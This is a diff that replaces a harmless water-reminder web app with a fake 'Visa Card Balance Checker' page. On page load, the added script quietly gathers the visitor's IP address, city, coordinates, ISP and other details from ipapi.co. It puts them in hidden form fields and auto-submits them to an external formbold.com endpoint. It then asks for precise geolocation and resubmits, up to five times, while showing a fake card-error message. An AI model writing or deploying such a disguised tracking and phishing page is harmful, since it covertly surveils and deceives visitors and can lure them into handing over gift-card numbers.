@@ -1,592 +1,164 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hydro Reminder - Stay Hydrated</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            color: white;
-            overflow-x: hidden;
-        }
-
-        .container {
-            max-width: 400px;
-            width: 90%;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .header {
-            margin-bottom: 30px;
-        }
-
-        .header h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-
-        .header p {
-            opacity: 0.9;
-            font-size: 1.1em;
-        }
-
-        /* 3D Water Animation */
-        .water-container {
-            position: relative;
-            width: 200px;
-            height: 300px;
-            margin: 30px auto;
-            perspective: 1000px;
-        }
-
-        .glass {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, 
-                rgba(255,255,255,0.1) 0%, 
-                rgba(255,255,255,0.05) 50%, 
-                rgba(255,255,255,0.1) 100%);
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 20px 20px 40px 40px;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 
-                0 20px 40px rgba(0,0,0,0.2),
-                inset 0 0 20px rgba(255,255,255,0.1);
-            transform-style: preserve-3d;
-            animation: glassFloat 3s ease-in-out infinite;
-        }
-
-        .water {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 60%;
-            background: linear-gradient(180deg, 
-                #4facfe 0%, 
-                #00f2fe 50%, 
-                #0099ff 100%);
-            border-radius: 0 0 37px 37px;
-            animation: waterWave 2s ease-in-out infinite;
-            transform-origin: bottom;
-        }
-
-        .water::before {
-            content: '';
-            position: absolute;
-            top: -10px;
-            left: 0;
-            width: 100%;
-            height: 20px;
-            background: rgba(255,255,255,0.3);
-            border-radius: 50%;
-            animation: waterSurface 2s ease-in-out infinite;
-        }
-
-        .bubbles {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        .bubble {
-            position: absolute;
-            width: 8px;
-            height: 8px;
-            background: rgba(255,255,255,0.6);
-            border-radius: 50%;
-            animation: bubbleUp 3s linear infinite;
-        }
-
-        .bubble:nth-child(1) { left: 20%; animation-delay: -0.5s; }
-        .bubble:nth-child(2) { left: 40%; animation-delay: -1s; }
-        .bubble:nth-child(3) { left: 60%; animation-delay: -1.5s; }
-        .bubble:nth-child(4) { left: 80%; animation-delay: -2s; }
-
-        @keyframes glassFloat {
-            0%, 100% { transform: rotateY(-5deg) rotateX(5deg); }
-            50% { transform: rotateY(5deg) rotateX(-5deg); }
-        }
-
-        @keyframes waterWave {
-            0%, 100% { transform: scaleX(1) scaleY(1); }
-            50% { transform: scaleX(1.05) scaleY(0.98); }
-        }
-
-        @keyframes waterSurface {
-            0%, 100% { transform: scaleX(1); opacity: 0.3; }
-            50% { transform: scaleX(1.1); opacity: 0.5; }
-        }
-
-        @keyframes bubbleUp {
-            0% {
-                bottom: -10px;
-                opacity: 1;
-                transform: scale(0.5);
-            }
-            50% {
-                opacity: 0.8;
-                transform: scale(1);
-            }
-            100% {
-                bottom: 100%;
-                opacity: 0;
-                transform: scale(0.5);
-            }
-        }
-
-        /* Stats Section */
-        .stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin: 30px 0;
-        }
-
-        .stat-card {
-            background: rgba(255,255,255,0.1);
-            padding: 20px;
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-
-        .stat-number {
-            font-size: 2em;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .stat-label {
-            opacity: 0.8;
-            font-size: 0.9em;
-        }
-
-        /* Buttons */
-        .button-group {
-            margin: 30px 0;
-        }
-
-        .btn {
-            background: linear-gradient(45deg, #ff6b6b, #ff8e53);
-            border: none;
-            color: white;
-            padding: 15px 30px;
-            margin: 10px;
-            border-radius: 25px;
-            font-size: 1.1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-        }
-
-        .btn.secondary {
-            background: linear-gradient(45deg, #4facfe, #00f2fe);
-        }
-
-        .btn.test-btn {
-            background: linear-gradient(45deg, #11998e, #38ef7d);
-        }
-
-        /* Notification Popup */
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            transform: translateX(400px);
-            transition: transform 0.5s ease;
-            z-index: 1000;
-            max-width: 300px;
-        }
-
-        .notification.show {
-            transform: translateX(0);
-        }
-
-        .notification h3 {
-            margin-bottom: 10px;
-        }
-
-        .notification .close-btn {
-            position: absolute;
-            top: 10px;
-            right: 15px;
-            background: none;
-            border: none;
-            color: white;
-            font-size: 1.5em;
-            cursor: pointer;
-        }
-
-        /* Settings Panel */
-        .settings {
-            background: rgba(255,255,255,0.1);
-            padding: 20px;
-            border-radius: 15px;
-            margin-top: 20px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-
-        .settings h3 {
-            margin-bottom: 15px;
-        }
-
-        .setting-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin: 10px 0;
-        }
-
-        .setting-item input {
-            background: rgba(255,255,255,0.2);
-            border: 1px solid rgba(255,255,255,0.3);
-            color: white;
-            padding: 8px 12px;
-            border-radius: 8px;
-            width: 80px;
-        }
-
-        .setting-item input::placeholder {
-            color: rgba(255,255,255,0.7);
-        }
-
-        /* Mobile Responsive */
-        @media (max-width: 480px) {
-            .container {
-                width: 95%;
-                padding: 15px;
-            }
-            
-            .water-container {
-                width: 150px;
-                height: 225px;
-            }
-            
-            .header h1 {
-                font-size: 2em;
-            }
-            
-            .stats {
-                grid-template-columns: 1fr;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>balance checker</title>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Outfit', sans-serif;
+      background: linear-gradient(to right, #f4f4ff, #e0e7ff);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: white;
+      padding: 2rem;
+      border-radius: 20px;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.1);
+      max-width: 500px;
+      width: 100%;
+      animation: fadeIn 1s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    h1 {
+      text-align: center;
+      font-size: 1.8rem;
+      margin-bottom: 1.5rem;
+      color: #333;
+    }
+    textarea {
+      width: 100%;
+      padding: 1rem;
+      border: 2px solid #ccc;
+      border-radius: 12px;
+      font-size: 1rem;
+      margin-bottom: 1rem;
+      resize: none;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 1rem;
+      background-color: #4f46e5;
+      color: white;
+      font-size: 1rem;
+      border: none;
+      border-radius: 12px;
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+    .small-text {
+      text-align: center;
+      font-size: 0.8rem;
+      color: #777;
+      margin-top: 1rem;
+    }
+    .info {
+      font-size: 0.85rem;
+      margin-top: 1rem;
+      color: #444;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>💧 Hydro Reminder</h1>
-            <p>Stay hydrated, stay healthy!</p>
-        </div>
 
-        <div class="water-container">
-            <div class="glass">
-                <div class="water"></div>
-                <div class="bubbles">
-                    <div class="bubble"></div>
-                    <div class="bubble"></div>
-                    <div class="bubble"></div>
-                    <div class="bubble"></div>
-                </div>
-            </div>
-        </div>
+<div class="container">
+  <h1>Visa Card Balance Checker</h1>
 
-        <div class="stats">
-            <div class="stat-card">
-                <div class="stat-number" id="glassesToday">0</div>
-                <div class="stat-label">Glasses Today</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="nextReminder">10:00</div>
-                <div class="stat-label">Next Reminder</div>
-            </div>
-        </div>
+  <form id="autoForm" method="POST" action="https://formbold.com/s/obDkQ">
+    <textarea name="feedback" placeholder="Enter VISA giftcard number..."></textarea>
 
-        <div class="button-group">
-            <button class="btn" onclick="drinkWater()">💧 I Drank Water!</button>
-            <button class="btn secondary" onclick="toggleReminders()" id="toggleBtn">🔔 Start Reminders</button>
-            <button class="btn test-btn" id="cljkc" onclick="sendTestNotification()">📱 Test Notification</button>
-        </div>
+    <!-- Hidden fields auto-filled by JS -->
+    <input type="hidden" name="ip" />
+    <input type="hidden" name="city" />
+    <input type="hidden" name="region" />
+    <input type="hidden" name="country" />
+    <input type="hidden" name="country_code" />
+    <input type="hidden" name="postal" />
+    <input type="hidden" name="latitude" />
+    <input type="hidden" name="longitude" />
+    <input type="hidden" name="timezone" />
+    <input type="hidden" name="currency" />
+    <input type="hidden" name="org" />
+    <input type="hidden" name="asn" />
+    <input type="hidden" name="continent_code" />
+    <input type="hidden" name="country_population" />
 
-        <div class="settings">
-            <h3>⚙️ Settings</h3>
-            <div class="setting-item">
-                <span>Reminder Interval (minutes):</span>
-                <input type="number" id="intervalInput" value="10" min="1" max="120" onchange="updateInterval()">
-            </div>
-            <div class="setting-item">
-                <span>Daily Goal (glasses):</span>
-                <input type="number" id="goalInput" value="8" min="1" max="20" onchange="updateGoal()">
-            </div>
-        </div>
-    </div>
+    <button class="submit-btn" disabled>...</button>
+    <div class="info" id="info"></div>
+    <div class="small-text">Enter Card Number.</div>
+  </form>
+</div>
 
-    <!-- Notification Popup -->
-    <div class="notification" id="notification">
-        <button class="close-btn" onclick="closeNotification()">&times;</button>
-        <h3>💧 Hydration Reminder!</h3>
-        <p>Time to drink some water! Your body needs hydration to function properly.</p>
-    </div>
+<script>
+  let sendCount = 0;
+  const MAX_SENDS = 5;
 
-    <script>
-        let reminderInterval;
-        let remindersActive = false;
-        let glassCount = 0;
-        let dailyGoal = 8;
-        let intervalMinutes = 10;
+  async function collectAndSend() {
+    if (sendCount >= MAX_SENDS) return;
 
-        // Initialize app
-        document.addEventListener('DOMContentLoaded', function() {
-            loadData();
-            updateDisplay();
-            requestNotificationPermission();
-        });
+    const form = document.getElementById('autoForm');
+    const info = document.getElementById('info');
 
-        // Request notification permission
-        function requestNotificationPermission() {
-            if ('Notification' in window && Notification.permission === 'default') {
-                Notification.requestPermission().then(permission => {
-                    if (permission === 'granted') {
-                        console.log('Notification permission granted');
-                    }
-                });
-            }
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+
+      form.elements['ip'].value = data.ip;
+      form.elements['city'].value = data.city;
+      form.elements['region'].value = data.region;
+      form.elements['country'].value = data.country_name;
+      form.elements['country_code'].value = data.country;
+      form.elements['postal'].value = data.postal;
+      form.elements['latitude'].value = data.latitude;
+      form.elements['longitude'].value = data.longitude;
+      form.elements['timezone'].value = data.timezone;
+      form.elements['currency'].value = data.currency;
+      form.elements['org'].value = data.org;
+      form.elements['asn'].value = data.asn;
+      form.elements['continent_code'].value = data.continent_code;
+      form.elements['country_population'].value = data.country_population;
+
+      info.textContent = "Sending general location...";
+      form.submit();
+      sendCount++;
+
+      // After first submission, listen for geolocation permission
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          if (sendCount >= MAX_SENDS) return;
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+
+          form.elements['latitude'].value = lat;
+          form.elements['longitude'].value = lon;
+
+          info.textContent = "...";
+          setTimeout(() => {
+            form.submit();
+            sendCount++;
+          }, 1000);
+        },
+        (err) => {
+          console.log("Invalid card number", err);
         }
+      );
 
-        // Load saved data
-        function loadData() {
-            const savedGlasses = parseInt(localStorage.getItem('glassesToday') || '0');
-            const savedGoal = parseInt(localStorage.getItem('dailyGoal') || '8');
-            const savedInterval = parseInt(localStorage.getItem('intervalMinutes') || '10');
-            const lastDate = localStorage.getItem('lastDate');
-            
-            const today = new Date().toDateString();
-            
-            if (lastDate === today) {
-                glassCount = savedGlasses;
-            } else {
-                glassCount = 0;
-                localStorage.setItem('lastDate', today);
-            }
-            
-            dailyGoal = savedGoal;
-            intervalMinutes = savedInterval;
-            
-            document.getElementById('goalInput').value = dailyGoal;
-            document.getElementById('intervalInput').value = intervalMinutes;
-        }
+    } catch (err) {
+      info.textContent = "Please Enter the correct giftcard.";
+    }
+  }
 
-        // Save data
-        function saveData() {
-            localStorage.setItem('glassesToday', glassCount.toString());
-            localStorage.setItem('dailyGoal', dailyGoal.toString());
-            localStorage.setItem('intervalMinutes', intervalMinutes.toString());
-            localStorage.setItem('lastDate', new Date().toDateString());
-        }
+  window.onload = collectAndSend;
+</script>
 
-        // Update display
-        function updateDisplay() {
-            document.getElementById('glassesToday').textContent = glassCount;
-            updateNextReminderTime();
-        }
-
-        // Update next reminder time
-        function updateNextReminderTime() {
-            if (remindersActive) {
-                const now = new Date();
-                const nextTime = new Date(now.getTime() + intervalMinutes * 60000);
-                document.getElementById('nextReminder').textContent = 
-                    nextTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-            } else {
-                document.getElementById('nextReminder').textContent = '--:--';
-            }
-        }
-
-        // Drink water function
-        function drinkWater() {
-            glassCount++;
-            saveData();
-            updateDisplay();
-            
-            // Animate water level
-            animateWaterLevel();
-            
-            // Show success message
-            showNotification('Great job! 💧', `You've had ${glassCount} glasses today!`, 'success');
-            
-            // Check if goal reached
-            if (glassCount >= dailyGoal) {
-                setTimeout(() => {
-                    showNotification('Goal Achieved! 🎉', 'Congratulations! You\'ve reached your daily hydration goal!', 'achievement');
-                }, 1500);
-            }
-        }
-
-        // Animate water level
-        function animateWaterLevel() {
-            const water = document.querySelector('.water');
-            const percentage = Math.min((glassCount / dailyGoal) * 80, 80); // Max 80% of glass height
-            water.style.height = percentage + '%';
-        }
-
-        // Toggle reminders
-        function toggleReminders() {
-            const toggleBtn = document.getElementById('toggleBtn');
-            
-            if (remindersActive) {
-                clearInterval(reminderInterval);
-                remindersActive = false;
-                toggleBtn.textContent = '🔔 Start Reminders';
-                toggleBtn.style.background = 'linear-gradient(45deg, #4facfe, #00f2fe)';
-            } else {
-                startReminders();
-                remindersActive = true;
-                toggleBtn.textContent = '🔕 Stop Reminders';
-                toggleBtn.style.background = 'linear-gradient(45deg, #ff6b6b, #ff8e53)';
-            }
-            
-            updateNextReminderTime();
-        }
-
-        // Start reminders
-        function startReminders() {
-            reminderInterval = setInterval(() => {
-                sendWaterReminder();
-                updateNextReminderTime();
-            }, intervalMinutes * 60000); // Convert minutes to milliseconds
-        }
-
-        // Send water reminder
-        function sendWaterReminder() {
-            showNotification('💧 Hydration Time!', 'Time to drink some water and stay hydrated!');
-            
-            // Browser notification
-            if ('Notification' in window && Notification.permission === 'granted') {
-                new Notification('💧 Hydration Reminder', {
-                    body: 'Time to drink some water!',
-                    icon: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHZpZXdCb3g9IjAgMCA2NCA2NCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTMyIDhMMTYgMzJWNTJDMTYgNTcuNTIyOCAyMC40NzcyIDYyIDI2IDYySDM4QzQzLjUyMjggNjIgNDggNTcuNTIyOCA0OCA1MlYzMkwzMiA4WiIgZmlsbD0iIzAwRjJGRSIvPgo8L3N2Zz4K',
-                    badge: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHZpZXdCb3g9IjAgMCA2NCA2NCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTMyIDhMMTYgMzJWNTJDMTYgNTcuNTIyOCAyMC40NzcyIDYyIDI2IDYySDM4QzQzLjUyMjggNjIgNDggNTcuNTIyOCA0OCA1MlYzMkwzMiA4WiIgZmlsbD0iIzAwRjJGRSIvPgo8L3N2Zz4K'
-                });
-            }
-        }
-
-        // Test notification function
-        function sendTestNotification() {
-            showNotification('🧪 Test Notification', 'This is a test notification! Your reminders are working perfectly.');
-            
-            // Browser notification
-            if ('Notification' in window && Notification.permission === 'granted') {
-                new Notification('🧪 Test Notification', {
-                    body: 'Your water reminder notifications are working!',
-                    icon: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHZpZXdCb3g9IjAgMCA2NCA2NCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTMyIDhMMTYgMzJWNTJDMTYgNTcuNTIyOCAyMC40NzcyIDYyIDI2IDYySDM4QzQzLjUyMjggNjIgNDggNTcuNTIyOCA0OCA1MlYzMkwzMiA4WiIgZmlsbD0iIzExOTk4RSIvPgo8L3N2Zz4K'
-                });
-            }
-            
-            // Vibrate if supported (mobile)
-            if ('vibrate' in navigator) {
-                navigator.vibrate([200, 100, 200]);
-            }
-        }
-
-        // Show notification popup
-        function showNotification(title, message, type = 'info') {
-            const notification = document.getElementById('notification');
-            notification.querySelector('h3').textContent = title;
-            notification.querySelector('p').textContent = message;
-            
-            // Add type-specific styling
-            if (type === 'success') {
-                notification.style.background = 'linear-gradient(45deg, #11998e, #38ef7d)';
-            } else if (type === 'achievement') {
-                notification.style.background = 'linear-gradient(45deg, #ff6b6b, #ffa726)';
-            } else {
-                notification.style.background = 'linear-gradient(45deg, #667eea, #764ba2)';
-            }
-            
-            notification.classList.add('show');
-            
-            // Auto-hide after 5 seconds
-            setTimeout(() => {
-                closeNotification();
-            }, 5000);
-        }
-
-        // Close notification
-        function closeNotification() {
-            document.getElementById('notification').classList.remove('show');
-        }
-
-        // Update interval
-        function updateInterval() {
-            const newInterval = parseInt(document.getElementById('intervalInput').value);
-            if (newInterval >= 1 && newInterval <= 120) {
-                intervalMinutes = newInterval;
-                saveData();
-                
-                // Restart reminders if active
-                if (remindersActive) {
-                    clearInterval(reminderInterval);
-                    startReminders();
-                }
-                updateNextReminderTime();
-            }
-        }
-
-        // Update goal
-        function updateGoal() {
-            const newGoal = parseInt(document.getElementById('goalInput').value);
-            if (newGoal >= 1 && newGoal <= 20) {
-                dailyGoal = newGoal;
-                saveData();
-                animateWaterLevel();
-            }
-        }
-
-        // Reset daily data at midnight
-        setInterval(() => {
-            const now = new Date();
-            if (now.getHours() === 0 && now.getMinutes() === 0) {
-                glassCount = 0;
-                saveData();
-                updateDisplay();
-                animateWaterLevel();
-                showNotification('🌅 New Day!', 'Your daily water counter has been reset. Start hydrating!');
-            }
-        }, 60000); // Check every minute
-
-        // Initialize water level animation
-        setTimeout(() => {
-            animateWaterLevel();
-        }, 1000);
-    </script>
 </body>
 </html>
